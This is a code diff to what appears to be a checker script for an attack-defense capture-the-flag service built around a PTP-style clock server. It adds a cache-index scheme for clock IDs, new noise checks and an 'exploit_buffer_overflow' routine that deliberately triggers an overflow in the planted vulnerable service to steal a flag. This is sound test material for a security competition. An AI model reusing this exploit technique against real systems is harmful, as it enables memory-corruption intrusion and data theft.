@@ -112,10 +112,12 @@ Utility functions
 def get_time_ns():
     return time.clock_gettime_ns(time.CLOCK_MONOTONIC)
 
-def generate_port_id():
-    clock_id = random.randint(0x1, 0x7ffffffffffffffe)
-    port = random.randint(0x1, 0xfffe)
+def generate_port_id(cache_range: range = range(0, 256)):
+    cache_index = random.randint(cache_range.start, cache_range.stop - 1)
 
+    port = random.randint(0x1, 0xfffe)
+    clock_id = random.randint(0x200, 0x7ffffffffffff0) * 256 + cache_index - port
+    
     return clock_id, port
 
 def generate_secret(length: int):
@@ -622,7 +624,7 @@ async def putflag_visible(
     connection: WsConnection,
     logger: LoggerAdapter,
 ) -> None:
-    clock_id, port = generate_port_id()
+    clock_id, port = generate_port_id(range(2, 256)) # We require at least one cache entry in front for buffer overflow
     secret = generate_secret(16)
 
     # Generate random text in the beginning, so that the flag cannot be read by PTP messages
@@ -633,7 +635,7 @@ async def putflag_visible(
     prefix += " "
     description = prefix + task.flag
 
-    if len(description) > 1500:
+    if len(description) > 3000:
         raise InternalErrorException("Encountered flag with unsupported length")
 
     await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", description.encode("utf-8"))
@@ -651,7 +653,7 @@ async def putflag_hmac(
     logger: LoggerAdapter,    
 ) -> None:
     flag = encode_flag(task.flag, logger)
-    clock_id, port = generate_port_id()
+    clock_id, port = generate_port_id(range(0, 1)) # Dont be vulnerable to buffer overflow
     secret = generate_secret(50)
 
     if len(flag) > 128:
@@ -671,7 +673,7 @@ async def putflag_plain(
     logger: LoggerAdapter,    
 ) -> None:
     flag = encode_flag(task.flag, logger)
-    clock_id, port = generate_port_id()
+    clock_id, port = generate_port_id(range(0, 1)) # Dont be vulnerable to buffer overflow
     secret = generate_secret(16)
 
     if len(flag) > 128:
@@ -787,6 +789,21 @@ async def putnoise_user_description_twice(
 
     await db.set("userdata", (clock_id, port, secret, description))
 
+@checker.putnoise(3)
+async def putnoise_none(
+    task: PutnoiseCheckerTaskMessage,
+    db: ChainDB,
+    connection: WsConnection,
+    logger: LoggerAdapter,    
+) -> None:
+    clock_id, port = generate_port_id()
+    secret = generate_secret(50)
+    description = generate_secret(50)
+
+    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "none", description.encode("utf-8"))
+
+    await db.set("userdata", (clock_id, port, secret, description))
+
 @checker.getnoise(0)
 async def getnoise_sync(
     task: GetnoiseCheckerTaskMessage,
@@ -837,6 +854,21 @@ async def getnoise_user_description_twice(
         raise MumbleException("Missing database entry from putnoise")
 
     received_description = await get_user_description(connection, logger, clock_id, port, secret.encode("ascii"), "hmac")
+    assert_equals(received_description.decode(), description, "Received wrong description")
+
+@checker.getnoise(3)
+async def getnoise_none(
+    task: GetnoiseCheckerTaskMessage,
+    db: ChainDB,
+    connection: WsConnection,
+    logger: LoggerAdapter,    
+) -> None:
+    try:
+        clock_id, port, secret, description = await db.get("userdata")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+
+    received_description = await inspect_clock(connection, logger, clock_id, port, "")
     assert_equals(received_description.decode(), description, "Received wrong description")
 
 @checker.havoc(0)
@@ -913,6 +945,34 @@ async def exploit_memcmp(
     return received_flag
 
 @checker.exploit(1)
+async def exploit_buffer_overflow(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    connection: WsConnection,
+    logger:LoggerAdapter
+) -> typing.Optional[str]:
+    if task.attack_info is None:
+        raise MumbleException("No attack info")
+    
+    target_clock_id, target_port = decode_port_id(task.attack_info)
+    target_cache_index = (target_clock_id + target_port) % 256
+
+    cache_index = target_cache_index - 1
+    clock_id, port = generate_port_id(range(cache_index, cache_index + 1))
+    secret = generate_secret(100)
+
+    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", b"")
+
+    await inspect_clock(connection, logger, target_clock_id, target_port, secret, True) # Prepare cache
+    await inspect_clock(connection, logger, clock_id, port, secret) # Trigger buffer overflow
+
+    received_description = await inspect_clock(connection, logger, target_clock_id, target_port, "")
+    received_flag = searcher.search_flag(received_description)
+    
+    logger.info(f"Received flag {received_flag}")
+    return received_flag
+
+@checker.exploit(2)
 async def exploit_zerolength(
     task: ExploitCheckerTaskMessage,
     connection: UdpConnection,
@@ -956,7 +1016,7 @@ async def exploit_zerolength(
 
                 return received_flag
 
-@checker.exploit(2)
+@checker.exploit(3)
 async def exploit_replay(
     task: ExploitCheckerTaskMessage,
     connection: UdpConnection,
@@ -1014,7 +1074,7 @@ async def exploit_replay(
                 
                 return received_flag
 
-@checker.exploit(3)
+@checker.exploit(4)
 async def exploit_timing(
     task: ExploitCheckerTaskMessage,
     connection: UdpConnection,
